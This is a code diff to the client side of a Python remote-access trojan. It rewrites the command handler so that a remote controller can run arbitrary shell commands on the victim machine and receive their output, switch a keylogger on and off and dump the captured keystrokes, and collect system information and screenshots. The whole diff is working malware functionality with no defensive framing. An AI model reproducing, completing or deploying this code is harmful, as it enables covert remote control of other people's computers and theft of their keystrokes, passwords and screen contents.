@@ -55,17 +55,50 @@ class CLIENT:
         else:
             self.KEYLOGGER_STATUS = False
 
+    def execute(self, command):
+        data = command.decode('utf-8').split(":")
 
-        def execute(self, command):
-            data = command.decode('utf-8').split(":")
+        if data[0] == "shell":
 
-            if data[0] == "shell":
-                toexecute = date[1].rstrip(" ").lstrip
-                toexecute = "".join(toexecute.split())
-                if toexecute.split(" ")[0] == "cd":
-                    try:
-                        os.chris(toexecute.split(" ")[1])
-                        self.send_data("")
-                    except:
-                        self.send_data("Error while changing directory!")
-                        
+            #print("Executing Shell: " + data[1])
+            toexecute = data[1].rstrip(" ").lstrip(" ")
+            toexecute = " ".join(toexecute.split())
+            if toexecute.split(" ")[0] == "cd":
+                try:
+                    os.chdir(toexecute.split(" ")[1])
+                    self.send_data("")
+                except:
+                    self.send_data("Error while changing directory!")
+            else:
+                try:
+                    comm = subprocess.Popen(data[1], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
+                    output, errors = comm.communicate()
+                    self.send_data(output + errors)
+                except FileNotFoundError:
+                    self.send_data("No Such File or Directory")
+
+        elif data[0] == "keylogger":
+
+            #print("Executing Keylogger: " + data[1])
+            if data[1] == "on":
+                self.turn_keylogger(True)
+                self.send_data("")
+            elif data[1] == "off":
+                self.turn_keylogger(False)
+                self.send_data("")
+            elif data[1] == "dump":
+                self.send_data(self.KEYLOGGER_STROKES)
+
+        elif data[0] == "sysinfo":
+
+            #print("Executing Sysinfo: " + data[1])
+            sysinfo = SYSINFO()
+            self.send_data(sysinfo.get_data())
+
+        elif data[0] == "screenshot":
+
+            #print("Executing Screenshot: " + data[1])
+            screenshot = SCREENSHOT()
+            self.send_data(screenshot.get_data(), encode=False)
+
+      
